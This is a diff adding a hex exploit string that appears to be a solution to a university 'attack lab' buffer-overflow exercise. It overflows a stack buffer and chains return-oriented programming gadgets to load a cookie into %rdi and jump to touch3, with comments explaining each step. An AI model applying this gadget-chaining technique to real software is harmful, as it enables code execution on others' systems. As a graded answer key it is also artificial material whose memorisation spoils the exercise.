@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* fill up the buffer in the stack so we can execute the instructions below */
+5c 14 40 00 00 00 00 00 /* address of the gadget which will pop %rax from the stack */
+14 13 e2 16 00 00 00 00 /* my cookie, puts it into %rax because we popped %rax from the stack the line before */
+60 14 40 00 00 00 00 00 /* address of the instruction that will move the cookie (stored in %rax) to %rdi */
+b5 13 40 00 00 00 00 00 /* address of touch3 */
